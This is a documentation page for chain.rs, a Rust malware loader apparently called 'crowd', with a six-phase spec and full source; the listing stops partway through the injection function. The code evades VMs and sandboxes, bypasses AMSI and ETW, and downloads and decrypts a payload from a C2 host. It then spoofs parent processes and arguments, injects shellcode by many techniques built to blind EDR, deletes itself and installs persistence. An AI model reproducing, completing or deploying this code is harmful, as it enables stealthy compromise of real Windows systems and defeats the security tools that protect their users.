# crowd — chain.rs   (🔥 S TIER — v6 — Cadena completa 6 fases + Tsukuyomi Tier A, RecycledGate handles)

| Field | Value |
|-------|-------|
| **Source** | `src/dark_crystal/crowd/src/chain.rs` |
| **Lines** | 2429 |
| **Tier** | V |
| **Cards** | T022-architecture |
| **Role** | ChainConfig + technique composition |
| **Inline ASM** | Yes |
| **Unsafe blocks** | 125 |

## Purpose

# crowd — chain.rs   (🔥 S TIER — v6 — Cadena completa 6 fases + Tsukuyomi Tier A, RecycledGate handles)

## Orden exacto del spec:

```text
═══ FASE 1: DROPPER ════════════════════════════════════════════════════
[1] Anti-VM (CPUID+RDTSC+MAC+cores+RAM) → sleep 24h (no abort)
[2] API Hammering (iters/secs configurables) → sleep 24h si acelerado
[3] AMSI HBP via DR0 → fallback Page Guard si DR0 ocupado
[4] Block-DLL-Policy en el dropper mismo
[5] Staged download WinHTTP → SHA256/chunk → NtAllocateVirtualMemory(MEM_LARGE_PAGES)
[6] AES-GCM decrypt in-place → zstd decompress → shellcode en RAM

═══ CASCADE RESOLVER ════════════════════════════════════════════════════
[P1] FreshyCalls (Zw* RVA sort) — inmune a hooks
[P2] KnownDlls NtOpenSection fallback
[P3] RecycledGate (0F 05 C3 scan)
[P4] Exception-Based SSN extraction
[CACHE] Phantom Stubs en MEM_IMAGE (7B: mov eax,SSN; syscall; ret)

═══ FASE 3: EXECUTION SETUP ════════════════════════════════════════════
[1] ETW Muffle (provider pointer → fallback byte-patch)
[2] PPID Spoof (explorer/RuntimeBroker)
[3] NtCreateUserProcess SUSPENDED + Block-DLL en hijo
[4] Process Argument Spoofing (benign→real en PEB)
[5] Module Overloading en target (xpsservices.dll → MEM_IMAGE)

═══ FASE 4: INJECTION ══════════════════════════════════════════════════
[1] Mapping Injection (NtCreateSection + NtMapViewOfSection)
[2] Call Stack Spoofing
[3] Threadless → ALT Pool Party → ALT2 WaitingThread Hijacking

─── Tsukuyomi Tier A (selectable via --<technique> CLI flag) ───
[T1] Early Bird APC (CreateProcess SUSPENDED → QueueUserAPC)
[T2] Process Hypnosis (DEBUG_ONLY_THIS_PROCESS → lpStartAddress)
[T3] Dirty Vanity (RtlCreateProcessReflection — process forking)
[T4] Process Herpaderping (SEC_IMAGE → overwrite file → execute)
[T5] Module Stomping (LoadLibraryExA DONT_RESOLVE → overwrite .text)
[T6] Proxy DLL Load (TpAllocWork/TpPostWork — ETW-TI evasion)
[T7] KiStepOver (HW breakpoint on EDR hooks → NtContinue bypass)
Note: T7 is a pre-treatment, chains into default [3]

═══ FASE 5: CLEANUP ════════════════════════════════════════════════════
[1] SecureZeroMemory del payload buffer
[2] Self-Deletion ADS (ADS rename + DELETE_ON_CLOSE)
[3] BlockHandle SDDL en proceso target
[4] Sleep Obfuscation Ekko
[5] PEB Module Unlinking (3 listas)

═══ FASE 6: PERSISTENCIA ═══════════════════════════════════════════════
[P1] COM Object Hijacking HKCU
[P2] NTFS EA (kernel32.dll.mui)
[P3] Scheduled Task via ITaskService
[P4] TLS Callback en DLL de tercero
Resilience: hilo monitor que reinstala mecanismos caídos cada 30min
```

## Types

### enum `InjectionMethod` (line 71)

### struct `ChainConfig` (line 114)

### struct `PBI` (line 349)

### struct `PBI` (line 1042)

### struct `PBI` (line 1898)

## Public API

### `decrypt_fsm` (line 262)
```rust
pub fn decrypt_fsm(ctx: &mut crate::fsm::ExecutionContext) -> bool
```

### `setup_fsm` (line 316)
```rust
pub fn setup_fsm(ctx: &mut crate::fsm::ExecutionContext) -> bool
```

### `inject_fsm` (line 391)
```rust
pub fn inject_fsm(ctx: &mut crate::fsm::ExecutionContext) -> bool
```

### `persistence_fsm` (line 672)
```rust
pub fn persistence_fsm(ctx: &mut crate::fsm::ExecutionContext) -> bool
```

### `cleanup_fsm` (line 681)
```rust
pub fn cleanup_fsm(ctx: &mut crate::fsm::ExecutionContext) -> bool
```

### `run` (line 817)
```rust
pub fn run(cfg: ChainConfig) -> Result<()>
```
Ejecuta la cadena completa de 6 fases.

### `load_dll_into_target` (line 1604)
```rust
pub fn load_dll_into_target(h_proc: usize, dll_path: &str) -> Result<usize>
```

### `inject_threadless_remote` `unsafe` (line 1650)
```rust
pub unsafe fn inject_threadless_remote(target_pid: u32, shellcode: &[u8]) -> bool
```

### `waiting_thread_inject` `unsafe` (line 1672)
```rust
pub unsafe fn waiting_thread_inject(target_pid: u32, shellcode: &[u8]) -> Result<()>
```

### `run_with_shellcode` (line 1807)
```rust
pub fn run_with_shellcode(cfg: ChainConfig, shellcode: Vec<u8>) -> anyhow::Result<()>
```
Versión de `run` que recibe el shellcode ya descifrado (skip download/decrypt).
Usada para payloads embebidos en compile-time vía payload_cfg.

### `run_with_embedded` (line 2409)
```rust
pub fn run_with_embedded(cfg: ChainConfig, embedded: &[u8]) -> anyhow::Result<()>
```
Backward-compat alias.

NOTE (Bug 17): If `embedded` points to static data (e.g. via include_bytes!),
secure_zero_memory only clears the heap copy. The original data remains
in the .rodata section.

## Internal Functions

- `default` (line 109)
- `default` (line 213)
- `inject_ghost_fsm` (line 584)
- `inject_overload_fsm` (line 596)
- `threadless_fsm` (line 616)
- `pool_party_fsm` (line 627)
- `waiting_thread_fsm` (line 643)
- `stomp_fsm` (line 661)
- `goto_cleanup` — Runs FASE 5+6 cleanup after a Tsukuyomi technique completes. (line 758)
- `inject_ghost` (line 1415)
- `inject_overload` (line 1425)
- `threadless` (line 1450)
- `pool_party` (line 1462)
- `stomp` (line 1493)
- `get_own_image_base` (unsafe) (line 1791)
- `inject_ghost` (line 2261)
- `inject_overload` (line 2270)
- `threadless` (line 2291)
- `pool_party` (line 2302)
- `stomp` (line 2330)
- `inject_inline` (line 2413)

## Key Dependencies

- `use anyhow::{anyhow, Context, Result};`
- `use ntapi::ntioapi::IO_STATUS_BLOCK;`
- `use windows::Win32::Foundation::HANDLE as WinHandle;`
- `use winapi::um::tlhelp32::*;`
- `use winapi::um::processthreadsapi::OpenThread;`
- `use winapi::shared::minwindef::FALSE;`
- `use winapi::um::winnt::{THREAD_ALL_ACCESS, CONTEXT_FULL};`
- `use anyhow::Context;`

## Full Source

```rust
//! # crowd — chain.rs   (🔥 S TIER — v6 — Cadena completa 6 fases + Tsukuyomi Tier A, RecycledGate handles)
//!
//! ## Orden exacto del spec:
//!
//! ```text
//! ═══ FASE 1: DROPPER ════════════════════════════════════════════════════
//! [1] Anti-VM (CPUID+RDTSC+MAC+cores+RAM) → sleep 24h (no abort)
//! [2] API Hammering (iters/secs configurables) → sleep 24h si acelerado
//! [3] AMSI HBP via DR0 → fallback Page Guard si DR0 ocupado
//! [4] Block-DLL-Policy en el dropper mismo
//! [5] Staged download WinHTTP → SHA256/chunk → NtAllocateVirtualMemory(MEM_LARGE_PAGES)
//! [6] AES-GCM decrypt in-place → zstd decompress → shellcode en RAM
//!
//! ═══ CASCADE RESOLVER ════════════════════════════════════════════════════
//! [P1] FreshyCalls (Zw* RVA sort) — inmune a hooks
//! [P2] KnownDlls NtOpenSection fallback
//! [P3] RecycledGate (0F 05 C3 scan)
//! [P4] Exception-Based SSN extraction
//! [CACHE] Phantom Stubs en MEM_IMAGE (7B: mov eax,SSN; syscall; ret)
//!
//! ═══ FASE 3: EXECUTION SETUP ════════════════════════════════════════════
//! [1] ETW Muffle (provider pointer → fallback byte-patch)
//! [2] PPID Spoof (explorer/RuntimeBroker)
//! [3] NtCreateUserProcess SUSPENDED + Block-DLL en hijo
//! [4] Process Argument Spoofing (benign→real en PEB)
//! [5] Module Overloading en target (xpsservices.dll → MEM_IMAGE)
//!
//! ═══ FASE 4: INJECTION ══════════════════════════════════════════════════
//! [1] Mapping Injection (NtCreateSection + NtMapViewOfSection)
//! [2] Call Stack Spoofing
//! [3] Threadless → ALT Pool Party → ALT2 WaitingThread Hijacking
//!
//! ─── Tsukuyomi Tier A (selectable via --<technique> CLI flag) ───
//! [T1] Early Bird APC (CreateProcess SUSPENDED → QueueUserAPC)
//! [T2] Process Hypnosis (DEBUG_ONLY_THIS_PROCESS → lpStartAddress)
//! [T3] Dirty Vanity (RtlCreateProcessReflection — process forking)
//! [T4] Process Herpaderping (SEC_IMAGE → overwrite file → execute)
//! [T5] Module Stomping (LoadLibraryExA DONT_RESOLVE → overwrite .text)
//! [T6] Proxy DLL Load (TpAllocWork/TpPostWork — ETW-TI evasion)
//! [T7] KiStepOver (HW breakpoint on EDR hooks → NtContinue bypass)
//!      Note: T7 is a pre-treatment, chains into default [3]
//!
//! ═══ FASE 5: CLEANUP ════════════════════════════════════════════════════
//! [1] SecureZeroMemory del payload buffer
//! [2] Self-Deletion ADS (ADS rename + DELETE_ON_CLOSE)
//! [3] BlockHandle SDDL en proceso target
//! [4] Sleep Obfuscation Ekko
//! [5] PEB Module Unlinking (3 listas)
//!
//! ═══ FASE 6: PERSISTENCIA ═══════════════════════════════════════════════
//! [P1] COM Object Hijacking HKCU
//! [P2] NTFS EA (kernel32.dll.mui)
//! [P3] Scheduled Task via ITaskService
//! [P4] TLS Callback en DLL de tercero
//! Resilience: hilo monitor que reinstala mecanismos caídos cada 30min
//! ```

#![allow(dead_code)]

use anyhow::{anyhow, Context, Result};
use ntapi::ntioapi::IO_STATUS_BLOCK;
use std::ptr::null_mut;
#[allow(unused_imports)] use crate::mega_dbg;

// ── Injection method selector (Tsukuyomi Tier A techniques) ──────────────

/// Selects which injection technique to use.
/// `Auto` = existing chain (Threadless → PoolParty → WaitingThread → FuncStomp).
/// Explicit variants bypass the chain and use a single technique.
#[derive(Debug, Clone, PartialEq)]
pub enum InjectionMethod {
    /// Default: Threadless → Pool Party → WaitingThread → FuncStomp fallback chain
    Auto,
    /// Early Bird APC: CreateProcess(SUSPENDED) → QueueUserAPC before EDR hooks
    EarlyBird,
    /// Early Bird + PPID Spoof combo
    EarlyBirdPpid,
    /// Process Hypnosis: DEBUG_ONLY_THIS_PROCESS → WriteProcessMemory at lpStartAddress
    Hypnosis,
    /// Dirty Vanity: RtlCreateProcessReflection (process forking, bypasses kernel callbacks)
    DirtyVanity,
    /// Process Herpaderping: SEC_IMAGE from file → overwrite file with decoy → execute
    Herpaderping,
    /// Module Stomping: LoadLibraryExA(DONT_RESOLVE) → overwrite .text with shellcode
    ModuleStomp,
    /// Proxy DLL Load: TpAllocWork/TpPostWork to hide LoadLibrary from ETW-TI
    ProxyDll,
    /// KiUserExceptionDispatcher StepOver: hardware breakpoint to bypass EDR hooks on syscalls
    KiStepOver,
    /// Early Cascade: APC injection during process initialization window (pre-EDR)
    EarlyCascade,
    /// Mapping Injection: standalone NtCreateSection+NtMapViewOfSection (no NtWriteVirtualMemory)
    MappingInject,
    /// WaitingThread Hijacking: enhanced WAIT-state-aware thread hijacking
    WaitingThreadHijack,
    /// NtCreateUserProcess: NT-level process creation + shellcode injection
    NtCreateProcess,
    /// Reflective PE: manual PE mapping in-process without LoadLibrary
    ReflectivePe,
    /// Pool Party: direct thread pool worker factory manipulation (bypass Auto fallback chain)
    PoolParty,
    /// Module Overloading: NtCreateSection(SEC_IMAGE) + NtMapViewOfSection DLL replacement
    Overload,
    /// Phantom/Ghost: SEC_IMAGE backed execution via Process Ghosting (delete-pending)
    Phantom,
}

impl Default for InjectionMethod {
    fn default() -> Self { InjectionMethod::Auto }
}

// ── Configuración completa ─────────────────────────────────────────────────

pub struct ChainConfig {
    // ── Fase 1 ──────────────────────────────────────────────────────────────
    /// Anti-VM habilitado.
    pub anti_vm: bool,
    /// Semilla para API Hammering (0 = skip hammering).
    pub hammer_seed: u32,
    /// Iteraciones FPU/SIMD para hammering (0 = default 3M).
    pub hammer_iters: u32,
    /// Segundos mínimos esperados del hammering (0 = default 2s).
    pub hammer_min_secs: u64,

    // ── Payload ──────────────────────────────────────────────────────────────
    /// Ruta al payload en disco (vacío = modo download).
    pub payload_path: String,
    /// Host del C2 para descarga WinHTTP (vacío = usar payload_path).
    pub c2_host: String,
    /// Path del C2 para descarga.
    pub c2_path: String,
    /// Puerto HTTPS del C2.
    pub c2_port: u16,
    /// SHA-256 digests por chunk para validación (vacío = sin validación).
    pub chunk_hashes: Vec<[u8; 32]>,
    /// AES-256-GCM key (32B, todo-cero = no cifrado).
    pub aes_key: [u8; 32],
    /// Hint de tamaño post-decrypt para zstd (0 = sin hint).
    pub decompress_out_mb: usize,

    // ── Execution setup ───────────────────────────────────────────────────────
    /// ETW patch habilitado.
    pub patch_etw: bool,
    /// PID padre para PPID spoof (0 = auto explorer.exe, None = skip).
    pub ppid_parent: Option<u32>,
    /// Args benignos para el proceso hijo (para Argument Spoofing).
    pub decoy_args: String,
    /// Args reales para el proceso hijo.
    pub real_args: String,
    /// DLL para Module Overloading en target (None = skip).
    pub overload_target_dll: Option<String>,

    // ── Injection ─────────────────────────────────────────────────────────────
    /// PID del proceso target para injection remota (None = local).
    pub target_pid: Option<u32>,
    /// Usar Threadless como primer intento.
    pub use_threadless: bool,
    /// DLL de fallback para Function Stomp local.
    pub stomp_dll: String,
    /// Export para Function Stomp.
    pub stomp_export: String,
    /// Injection technique override (Auto = default chain).
    pub injection_method: InjectionMethod,
    /// Target exe for techniques that spawn a new process (EarlyBird, Hypnosis).
    pub injection_target_exe: String,
    /// Decoy PE bytes for Herpaderping (None = use notepad.exe from disk).
    pub herpaderp_decoy: Option<Vec<u8>>,

    // ── Cleanup ──────────────────────────────────────────────────────────────
    /// Duración Ekko sleep en ms (0 = skip).
    pub sleep_ms: u64,
    /// Self-delete habilitado.
    pub self_delete: bool,
    /// Stompar propio PE header.
    pub stomp_own_header: bool,
    /// Aplicar BlockHandle SDDL al target.
    pub block_handle: bool,
    /// PEB Module Unlink del agente en target.
    pub peb_unlink: bool,

    // ── Persistencia ─────────────────────────────────────────────────────────
    /// Instalar persistencia Fase 6.
    pub persist: bool,
    /// Config de persistencia (None = defaults).
    pub persist_cfg: Option<crate::persist::PersistConfig>,

    // ── Phase 1+2: New S/A-tier technique toggles ─────────────────────────
    /// BYOVD Evasion — load vulnerable driver to blind EDR sensors.
    pub byovd_enabled: bool,
    /// Embedded driver bytes for BYOVD (empty = skip).
    pub byovd_driver: Vec<u8>,
    /// VEH Gate — use VEH for syscall dispatch instead of RecycledGate.
    pub veh_syscalls: bool,
    /// IAT Camouflage profile (0=off, 3=basic, 4=network, 5=full).
    pub iat_camo_profile: u32,
    /// AMSI Page Guard — alternative AMSI bypass when DR0 is occupied.
    pub amsi_page_guard: bool,
    /// Hells/Halos/Tartarus Gate — dynamic SSN resolution on hooked ntdll.
    pub hells_gate: bool,
    /// Mapping Injection toggle — use NtCreateSection+NtMapViewOfSection in default chain.
    pub mapping_inject: bool,
    /// Early Cascade Injection — APC during process initialization.
    pub early_cascade: bool,
    /// WaitingThread Hijacking — enhanced WAIT-state aware version.
    pub waiting_thread: bool,
    /// NtCreateUserProcess — NT-level process creation (replaces CreateProcessW).
    pub nt_create_process: bool,
    /// Reflective PE Loader — manual PE mapping without LoadLibrary.
    pub reflective_pe: bool,
}

impl Default for ChainConfig {
    fn default() -> Self {
        Self {
            anti_vm:            true,
            hammer_seed:        0x1337_cafe,
            hammer_iters:       0,   // 0 = default 3M
            hammer_min_secs:    0,   // 0 = default 2s
            payload_path:       String::new(),
            c2_host:            String::new(),
            c2_path:            String::new(),
            c2_port:            443,
            chunk_hashes:       Vec::new(),
            aes_key:            [0u8; 32],
            decompress_out_mb:  0,
            patch_etw:          true,
            ppid_parent:        None,
            decoy_args:         crate::arg_spoof::BENIGN_ARGS.into(),
            real_args:          String::new(),
            overload_target_dll: Some(r"C:\Windows\System32\xpsservices.dll".into()),
            target_pid:         None,
            use_threadless:     true,
            stomp_dll:          "version.dll".into(),
            stomp_export:       "VerQueryValueA".into(),
            injection_method:   InjectionMethod::Auto,
            injection_target_exe: r"C:\Windows\System32\svchost.exe".into(),
            herpaderp_decoy:    None,
            sleep_ms:           2000,
            self_delete:        true,
            stomp_own_header:   true,
            block_handle:       true,
            peb_unlink:         true,
            persist:            false, // off by default — enable explicitly
            persist_cfg:        None,
            byovd_enabled:      false,
            byovd_driver:       Vec::new(),
            veh_syscalls:       false,
            iat_camo_profile:   0,
            amsi_page_guard:    false,
            hells_gate:         false,
            mapping_inject:     false,
            early_cascade:      false,
            waiting_thread:     false,
            nt_create_process:  false,
            reflective_pe:      false,
        }
    }
}

// ── FSM Integration ────────────────────────────────────────────────────────

pub fn decrypt_fsm(ctx: &mut crate::fsm::ExecutionContext) -> bool {
    if ctx.payload_buffer.is_empty() {
        mega_dbg!("Decrypt: FALLO — payload_buffer vacío (Loading no lleno el buffer)");
        return false;
    }

    mega_dbg!("Decrypt: payload_buffer={}B", ctx.payload_buffer.len());

    let encrypted = ctx.config.aes_key.iter().any(|&b| b != 0);
    if encrypted {
        mega_dbg!("Decrypt: AES-GCM+zstd activo, descifrando...");
        match crate::crypto::decrypt_and_decompress(&ctx.payload_buffer, &ctx.config.aes_key, ctx.config.decompress_out_mb) {
            Ok(decrypted) => {
                mega_dbg!("Decrypt: AES-GCM OK — plaintext={}B", decrypted.len());
                ctx.payload_buffer = decrypted;
            }
            Err(e) => {
                mega_dbg!("Decrypt: AES-GCM FALLO — {} (key incorrecto, datos corruptos o tag inválido)", e);
                return false;
            }
        }
    } else {
        mega_dbg!("Decrypt: no hay clave AES — payload se usa en crudo");
    }

    let buf = &ctx.payload_buffer;
    if buf.len() < 64 {
        mega_dbg!("Decrypt: FALLO — payload demasiado pequeño ({}B < 64B mínimo)", buf.len());
        return false;
    }

    // Validate PE optional header magic (0x010B=PE32, 0x020B=PE64)
    if buf.len() > 2 && buf[0] == 0x4D && buf[1] == 0x5A {
        mega_dbg!("Decrypt: cabecera MZ detectada — validando PE magic...");
        if buf.len() >= 0x40 {
            let e_lfanew = u32::from_le_bytes([buf[0x3C], buf[0x3D], buf[0x3E], buf[0x3F]]) as usize;
            if e_lfanew + 24 + 2 <= buf.len() {
                let opt_hdr_offset = e_lfanew + 4 + 20;
                let magic = u16::from_le_bytes([buf[opt_hdr_offset], buf[opt_hdr_offset + 1]]);
                if magic != 0x010B && magic != 0x020B {
                    mega_dbg!("Decrypt: FALLO — PE magic inválido 0x{:04X} (esperado 0x010B PE32 o 0x020B PE64)", magic);
                    return false;
                }
                mega_dbg!("Decrypt: PE magic OK — 0x{:04X} ({})", magic,
                    if magic == 0x020B { "PE64" } else { "PE32" });
            }
        }
    } else {
        mega_dbg!("Decrypt: sin cabecera MZ — tratando como shellcode crudo");
    }

    true
}

pub fn setup_fsm(ctx: &mut crate::fsm::ExecutionContext) -> bool {
    // Inicializar syscall map
    let _ = crate::syscall_map::syscall_map();
    crate::phantom::build_phantom_stubs();
    mega_dbg!("Setup: syscall_map y phantom_stubs inicializados");

    // PPID Spoof + Create Process
    // Skip for Tier A techniques — they create their own processes.
    // Only needed for Auto (default chain) and KiStepOver (pre-treatment).
    let tier_a_active = !matches!(ctx.config.injection_method,
        InjectionMethod::Auto | InjectionMethod::KiStepOver);

    if !tier_a_active && ctx.config.target_pid.is_none() && ctx.config.ppid_parent.is_some() {
        let raw_ppid = ctx.config.ppid_parent.unwrap();
        let parent_pid = match raw_ppid {
            0 => {
                let p = crate::ppid::find_pid_by_name("explorer.exe").unwrap_or(0);
                mega_dbg!("Setup: PPID auto — explorer.exe PID={}", p);
                p
            }
            p => { mega_dbg!("Setup: PPID manual={}", p); p }
        };

        let nethost = r"C:\Windows\System32\svchost.exe";
        mega_dbg!("Setup: spawn_with_ppid_spoof('{}', parent={})", nethost, parent_pid);
        match crate::ppid::spawn_with_ppid_spoof(nethost, parent_pid, true) {
            Ok((hp, ht)) => {
                ctx.target_info.process_handle = hp as _;
                ctx.target_info.thread_handle = ht as _;

                // NtQueryInformationProcess(ProcessBasicInformation) → PID
                let pid = unsafe {
                    #[repr(C)]
                    struct PBI { _pad: [usize; 4], unique_pid: usize, _inh: usize }
                    let mut pbi: PBI = std::mem::zeroed();
                    let mut ret_len: u32 = 0;
                    let st = crate::recycled::nt_query_information_process(
                        hp as usize, 0, // ProcessBasicInformation
                        &mut pbi as *mut PBI as *mut u8,
                        std::mem::size_of::<PBI>() as u32,
                        &mut ret_len,
                    );
                    if st == 0 { pbi.unique_pid as u32 } else { 0u32 }
                };
                if pid == 0 {
                    mega_dbg!("Setup: FALLO — NtQueryInformationProcess PID=0");
                    return false;
                }
                ctx.target_info.pid = pid;
                mega_dbg!("Setup: proceso spawneado OK — PID={}", pid);

                // Spoof Args
                if !ctx.config.real_args.is_empty() {
                    mega_dbg!("Setup: spoofing args PEB — real_args='{}'", ctx.config.real_args);
                    let _ = crate::arg_spoof::spoof_args_in_peb(hp as usize, &ctx.config.real_args);
                }

                // Module Overloading
                if let Some(ref dll_path) = ctx.config.overload_target_dll {
                    mega_dbg!("Setup: module overload — DLL='{}'", dll_path);
                    let _ = load_dll_into_target(hp as usize, dll_path);
                }
            }
            Err(e) => {
                mega_dbg!("Setup: FALLO — spawn_with_ppid_spoof err={}", e);
                return false;
            }
        }
    } else {
        mega_dbg!("Setup: sin PPID spoof — target_pid={:?}", ctx.config.target_pid);
    }

    true
}

pub fn inject_fsm(ctx: &mut crate::fsm::ExecutionContext) -> bool {
    if ctx.payload_buffer.is_empty() {
        mega_dbg!("Inject: FALLO — payload_buffer vacío");
        return false;
    }

    let effective_pid = if ctx.target_info.pid != 0 {
        Some(ctx.target_info.pid)
    } else {
        ctx.config.target_pid
    };
    mega_dbg!("Inject: effective_pid={:?} payload={}B method={:?}",
        effective_pid, ctx.payload_buffer.len(), ctx.config.injection_method);

    let payload = &ctx.payload_buffer;

    // ── Tsukuyomi Tier A technique dispatch ──────────────────────────────
    // If a specific injection method is selected, use it directly instead
    // of the default chain. These bypass the PE/shellcode routing below.
    match ctx.config.injection_method {
        InjectionMethod::Auto => { /* fall through to default chain below */ }

        InjectionMethod::EarlyBird => {
            mega_dbg!("Inject[EarlyBird]: target_exe='{}'", ctx.config.injection_target_exe);
            let _sp = unsafe { crate::stack_spoof::spoof_caller() };
            return match crate::early_bird::early_bird_inject(&ctx.config.injection_target_exe, payload) {
                Ok(pid) => { mega_dbg!("Inject[EarlyBird]: OK — PID={}", pid); true }
                Err(e) => { mega_dbg!("Inject[EarlyBird]: FALLO — {}", e); false }
            };
        }

        InjectionMethod::EarlyBirdPpid => {
            let parent_pid = ctx.config.ppid_parent.unwrap_or(0);
            let parent_pid = if parent_pid == 0 {
                crate::ppid::find_pid_by_name("explorer.exe").unwrap_or(0)
            } else { parent_pid };
            mega_dbg!("Inject[EarlyBird+PPID]: target='{}' parent={}", ctx.config.injection_target_exe, parent_pid);
            let _sp = unsafe { crate::stack_spoof::spoof_caller() };
            return match crate::early_bird::early_bird_with_ppid(&ctx.config.injection_target_exe, payload, parent_pid) {
                Ok(pid) => { mega_dbg!("Inject[EarlyBird+PPID]: OK — PID={}", pid); true }
                Err(e) => { mega_dbg!("Inject[EarlyBird+PPID]: FALLO — {}", e); false }
            };
        }

        InjectionMethod::Hypnosis => {
            let target = if ctx.config.injection_target_exe.is_empty() {
                r"C:\Windows\System32\notepad.exe"
            } else {
                &ctx.config.injection_target_exe
            };
            mega_dbg!("Inject[Hypnosis]: target='{}'", target);
            let _sp = unsafe { crate::stack_spoof::spoof_caller() };
            return match crate::hypnosis::hypnotize_and_inject(target, payload) {
                Ok(pid) => { mega_dbg!("Inject[Hypnosis]: OK — PID={}", pid); true }
                Err(e) => { mega_dbg!("Inject[Hypnosis]: FALLO — {}", e); false }
            };
        }

        InjectionMethod::DirtyVanity => {
            // DirtyVanity ALWAYS reflects off explorer.exe — it needs a rich address
            // space for RtlCreateProcessReflection. The PPID-spoofed svchost (if any)
            // is a fresh empty process — useless for reflection.
            let explorer_pid = crate::ppid::find_pid_by_name("explorer.exe").unwrap_or(0);
            if explorer_pid == 0 {
                mega_dbg!("Inject[DirtyVanity]: FALLO — cannot find explorer.exe");
                return false;
            }
            mega_dbg!("Inject[DirtyVanity]: reflecting off explorer.exe PID={}", explorer_pid);
            let _sp = unsafe { crate::stack_spoof::spoof_caller() };
            return match crate::dirty_vanity::reflect_and_inject(explorer_pid, payload) {
                Ok(pid) => { mega_dbg!("Inject[DirtyVanity]: OK — reflected PID={}", pid); true }
                Err(e) => { mega_dbg!("Inject[DirtyVanity]: FALLO — {}", e); false }
            };
        }

        InjectionMethod::Herpaderping => {
            let is_pe = payload.len() > 2 && payload[0] == 0x4D && payload[1] == 0x5A;
            if !is_pe {
                mega_dbg!("Inject[Herpaderping]: FALLO — payload no es PE (requiere MZ header)");
                return false;
            }
            // Load a real PE as decoy. An empty/zero-byte file on disk is immediately
            // flagged by EDR heuristics — notepad.exe is a realistic stand-in.
            let decoy_owned: Vec<u8>;
            let decoy: &[u8] = match ctx.config.herpaderp_decoy.as_deref() {
                Some(d) if !d.is_empty() => d,
                _ => {
                    decoy_owned = std::fs::read(r"C:\Windows\System32\notepad.exe")
                        .unwrap_or_default();
                    &decoy_owned
                }
            };
            mega_dbg!("Inject[Herpaderping]: payload={}B decoy={}B", payload.len(), decoy.len());
            let _sp = unsafe { crate::stack_spoof::spoof_caller() };
            return match crate::herpaderping::herpaderp(payload, decoy, None) {
                Ok(pid) => { mega_dbg!("Inject[Herpaderping]: OK — PID={}", pid); true }
                Err(e) => { mega_dbg!("Inject[Herpaderping]: FALLO — {}", e); false }
            };
        }

        InjectionMethod::ModuleStomp => {
            mega_dbg!("Inject[ModuleStomp]: stomping chakra.dll with {}B shellcode", payload.len());
            let _sp = unsafe { crate::stack_spoof::spoof_caller() };
            return match crate::module_stomp::stomp_and_execute(payload, None) {
                Ok(()) => { mega_dbg!("Inject[ModuleStomp]: OK"); true }
                Err(e) => { mega_dbg!("Inject[ModuleStomp]: FALLO — {}", e); false }
            };
        }

        InjectionMethod::ProxyDll => {
            // ProxyDll loads a DLL via thread pool — used for DLL payloads on disk
            let dll_path = if ctx.config.injection_target_exe.is_empty() {
                mega_dbg!("Inject[ProxyDll]: FALLO — necesita --inject-target-exe con path al DLL");
                return false;
            } else {
                &ctx.config.injection_target_exe
            };
            mega_dbg!("Inject[ProxyDll]: loading '{}' via TpAllocWork/TpPostWork", dll_path);
            let _sp = unsafe { crate::stack_spoof::spoof_caller() };
            return match crate::proxy_dll::proxy_load_chained(dll_path) {
                Ok(h) => { mega_dbg!("Inject[ProxyDll]: OK — handle=0x{:x}", h); true }
                Err(e) => { mega_dbg!("Inject[ProxyDll]: FALLO — {}", e); false }
            };
        }

        InjectionMethod::PoolParty => {
            let pid = effective_pid.unwrap_or(0);
            if pid == 0 {
                mega_dbg!("Inject[PoolParty]: FALLO — no target PID");
                return false;
            }
            mega_dbg!("Inject[PoolParty]: direct inject into PID={}", pid);
            let _sp = unsafe { crate::stack_spoof::spoof_caller() };
            return match crate::pool_party::pool_party_inject(pid, payload) {
                Ok(_) => { mega_dbg!("Inject[PoolParty]: OK"); true }
                Err(e) => { mega_dbg!("Inject[PoolParty]: FALLO — {}", e); false }
            };
        }

        InjectionMethod::Overload => {
            let dll = ctx.config.overload_target_dll.as_deref()
                .unwrap_or(r"C:\Windows\System32\version.dll");
            mega_dbg!("Inject[Overload]: direct SEC_IMAGE overload — dll='{}'", dll);
            let _sp = unsafe { crate::stack_spoof::spoof_caller() };
            return match crate::overload::Module::new(payload.to_vec(), String::new(), dll.to_string()) {
                Ok(m) => {
                    let r = m.run().is_ok();
                    mega_dbg!("Inject[Overload]: resultado={}", r);
                    r
                }
                Err(e) => { mega_dbg!("Inject[Overload]: FALLO — {}", e); false }
            };
        }

        InjectionMethod::Phantom => {
            let ghostmask = crate::payload_cfg::GHOST_MASQUERADE;
            let ppid = ctx.config.ppid_parent.unwrap_or(0);
            mega_dbg!("Inject[Phantom/Ghost]: SEC_IMAGE delete-pending — mask='{}'", ghostmask);
            let _sp = unsafe { crate::stack_spoof::spoof_caller() };
            return match crate::ghost::spawn_ghosted(payload, ghostmask, ppid) {
                Ok(()) => { mega_dbg!("Inject[Phantom/Ghost]: OK"); true }
                Err(e) => { mega_dbg!("Inject[Phantom/Ghost]: FALLO — {}", e); false }
            };
        }

        InjectionMethod::KiStepOver => {
            // KiStepOver installs hardware breakpoints on EDR-hooked syscalls
            // This is a preparation technique, not injection per se — install then fall through
            mega_dbg!("Inject[KiStepOver]: installing exception dispatcher bypass");
            let _sp = unsafe { crate::stack_spoof::spoof_caller() };
            let n = crate::ki_step_over::install_step_over(&[
                "NtAllocateVirtualMemory", "NtWriteVirtualMemory", "NtProtectVirtualMemory",
                "NtCreateThreadEx", "NtMapViewOfSection", "NtCreateSection",
            ]);
            mega_dbg!("Inject[KiStepOver]: {} syscalls bypassed — continuing to default chain", n);
            // Fall through to default injection chain — KiStepOver just makes syscalls invisible to EDR
        }

        _ => { /* EarlyCascade, MappingInject, WaitingThreadHijack, NtCreateProcess, ReflectivePe — handled by run() */ }
    }

    // ── Default injection chain (Auto mode or KiStepOver pre-treatment) ──
    let is_pe = payload.len() > 2 && payload[0] == 0x4D && payload[1] == 0x5A;
    mega_dbg!("Inject: tipo={}", if is_pe { "PE (MZ)" } else { "shellcode crudo" });

    if is_pe {
        let size_mb = payload.len() / (1024 * 1024);
        let ghostmask = crate::payload_cfg::GHOST_MASQUERADE;
        let ppid_for_ghost = ctx.config.ppid_parent.unwrap_or(0);

        if size_mb >= 35 {
            mega_dbg!("Inject: ruta Ghost (PE ≥35MB) — mask='{}'", ghostmask);
            #[inline(never)]
            fn inject_ghost_fsm(payload: &[u8], mask: &str, ppid: u32) -> bool {
                let _sp = unsafe { crate::stack_spoof::spoof_caller() };
                let r = crate::ghost::spawn_ghosted(payload, mask, ppid).is_ok();
                mega_dbg!("Inject[Ghost]: resultado={}", r);
                r
            }
